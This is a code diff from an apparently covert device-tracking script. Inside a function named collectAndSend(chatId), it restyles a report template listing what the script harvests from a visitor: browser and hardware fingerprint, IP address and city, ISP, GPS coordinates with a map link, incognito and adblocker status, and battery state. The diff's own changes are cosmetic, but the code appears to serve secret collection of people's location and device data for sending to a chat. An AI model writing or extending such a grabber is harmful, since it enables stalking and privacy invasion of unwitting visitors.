@@ -236,46 +236,46 @@ async function collectAndSend(chatId) {
   const message = 
 `🔰 Device Information Report 🔰
 
-🌐 Basic Info:
+🌐 𝗕𝗮𝘀𝗶𝗰 𝗜𝗻𝗳𝗼:
 - Browser: ${browser}
 - Platform: ${platform}
 - Language: ${language}
 - Timezone: ${timezone}
 - Touch/Mouse: ${touchMouse}
 
-💻 Hardware:
+💻 𝗛𝗮𝗿𝗱𝘄𝗮𝗿𝗲:
 - CPU: ${cpuCores} cores
 - RAM: ${ram}
 - Screen: ${resolution}, ${colorDepth}
 - WebGL: ${webglRenderer} (${webglVendor})
 
-📶 Network Info:
+📶 𝗡𝗲𝘁𝘄𝗼𝗿𝗸 𝗜𝗻𝗳𝗼:
 - Connection Type: ${netType}
 - Speed: ${downlink}
 - Latency: ${rtt}
 - Data Saver: ${saveData}
 - ISP: ${org || 'Unknown'}
 
-📍 IP Info:
+📍 𝗜𝗣 𝗜𝗻𝗳𝗼:
 - IP: ${ip}
 - City: ${city}
 - Region: ${region}
 - Country: ${country}
-*Note: IP-based location may not be accurate.*
+𝙽𝚘𝚝𝚎: 𝙸𝙿-𝚋𝚊𝚜𝚎𝚍 𝚕𝚘𝚌𝚊𝚝𝚒𝚘𝚗 𝚖𝚊𝚢 𝚗𝚘𝚝 𝚋𝚎 𝚊𝚌𝚌𝚞𝚛𝚊𝚝𝚎.
 
-📌 GPS:
+📌 𝗚𝗣𝗦:
 - Status: ${geoResult.status}
 - Latitude: ${geoResult.latitude}
 - Longitude: ${geoResult.longitude}
 - Map View: https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}
 
-🔐 Privacy & Adblock Info:
+🔐 𝗣𝗿𝗶𝘃𝗮𝗰𝘆 & 𝗕𝗹𝗼𝗰𝗸𝗲𝗿𝘀 𝗜𝗻𝗳𝗼:
 - Incognito / Private Mode: ${incognitoResult}
-- Blocker Detected: ${adblockResult.detected}
+- Adblocker Detected: ${adblockResult.detected}
 - Method: ${adblockResult.method}
 - Cookies Blocked: ${adblockResult.cookiesBlocked}
 
-🔋 Battery:
+🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆:
 - Level: ${batteryLevel}
 - Charging: ${batteryCharging}
 `;
